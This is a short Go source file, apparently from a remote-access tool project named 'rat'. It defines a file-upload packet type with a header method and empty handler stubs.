package main

import (
	"rat/shared"
)

type UploadPacket struct {
	File  string `network:"send"`
	Final bool   `network:"send"`
	Data  []byte `network:"send"`
}

func (packet UploadPacket) Header() shared.PacketHeader {
	return shared.PutFileHeader
}

func (packet UploadPacket) Init(c *Client) {

}

func (packet UploadPacket) OnReceive(c *Client) error {
	return nil
}
